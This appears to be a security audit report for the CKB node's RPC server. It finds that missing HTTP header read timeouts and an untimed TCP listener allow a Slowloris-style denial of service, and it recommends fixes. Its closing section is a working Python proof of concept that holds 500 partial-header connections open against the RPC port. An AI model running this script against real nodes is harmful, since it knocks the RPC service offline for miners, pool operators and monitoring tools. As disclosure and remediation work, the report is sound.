Audit Report

## Title
Missing HTTP Header Read Timeout Enables Slowloris-Style DoS on RPC Server - (File: `rpc/src/server.rs`)

## Summary
The CKB RPC server's `start_server` function calls `axum::serve` without configuring `http1_header_read_timeout`, leaving the header-reading phase unprotected. The `TimeoutLayer` present in the middleware stack only activates after a complete HTTP request is parsed and dispatched, providing no protection against connections that drip-feed partial headers indefinitely. The TCP listener (`start_tcp_server`) compounds this with zero timeout of any kind on accepted connections.

## Finding Description
In `rpc/src/server.rs`, `start_server` builds an `axum` router with a `TimeoutLayer` set to 30 seconds and then calls `axum::serve(listener, app.into_make_service())` with no further configuration:

- `TimeoutLayer::with_status_code(StatusCode::REQUEST_TIMEOUT, Duration::from_secs(30))` at lines 125–128 is a **request-processing** timeout. It begins counting only after hyper has fully parsed the HTTP request and dispatched it to a handler. A connection that never completes its headers never reaches this layer.
- `axum::serve(listener, app.into_make_service())` at line 143 wraps hyper's server builder but never calls `http1_header_read_timeout`. A codebase-wide grep for `http1_header_read_timeout`, `header_read_timeout`, and `read_timeout` returns zero matches, confirming the omission is complete.
- `start_tcp_server` at lines 176–193 accepts raw TCP connections and wraps them in `LinesCodec` inside a `tokio::spawn` with no timeout. A connection that never sends a newline holds a Tokio task and a file descriptor open indefinitely.

An attacker opens many TCP connections to the RPC port and sends a partial HTTP header (e.g., `POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 100\r\n`) without ever completing it. Each connection occupies a Tokio task and a file descriptor. The `TimeoutLayer` never fires. Once the process file-descriptor limit or the OS accept-queue is saturated, the RPC server stops accepting new connections.

## Impact Explanation
The concrete impact is denial of service against the RPC interface: legitimate callers (miners polling `get_block_template`, monitoring tools, pool operators) receive connection-refused or timeout errors. This matches the allowed CKB bounty impact: **Note (0–500 points) — Any local RPC API crash**. The node's P2P layer, consensus engine, and block-processing pipeline are unaffected; only the RPC surface is rendered unavailable.

## Likelihood Explanation
The RPC server defaults to `127.0.0.1:8114`, so the default exposure is local processes only. Any unprivileged local process — including a malicious script or a compromised co-located service — can open 500+ connections and trigger the condition without any special privileges. Operators who bind the RPC port to a LAN or public interface (explicitly warned against in the config but not prevented) extend the attack surface to remote unprivileged callers. The `RpcConfig` struct has no `read_header_timeout` field, so there is no operator-side workaround. The attack is repeatable and requires no authentication.

## Recommendation
**HTTP/WS server**: Use axum's serve builder to set a hyper-level header read timeout:
```rust
axum::serve(listener, app.into_make_service())
    .http1_header_read_timeout(Duration::from_secs(5))
```
**TCP server**: Wrap each accepted connection with `tokio::time::timeout` before handing it to `serve_stream_sink`, so idle connections that never send a newline are dropped after a configurable deadline.

Add a `read_header_timeout` field to `RpcConfig` (`util/app-config/src/configs/rpc.rs`) so operators can tune the value.

## Proof of Concept
```python
import socket, time

TARGET = ("127.0.0.1", 8114)
socks = []
for _ in range(500):
    s = socket.socket()
    s.connect(TARGET)
    # Partial HTTP header — never completed, TimeoutLayer never fires
    s.send(b"POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 100\r\n")
    socks.append(s)

while True:
    for s in socks:
        try:
            s.send(b"X")  # drip one byte to keep connection alive
        except:
            pass
    time.sleep(10)
```
With 500 connections held open, a concurrent `curl -s http://127.0.0.1:8114/ -d '{"id":1,"jsonrpc":"2.0","method":"get_tip_block_number","params":[]}'` will stall or fail. The `TimeoutLayer` never fires because no complete request is ever dispatched to a handler.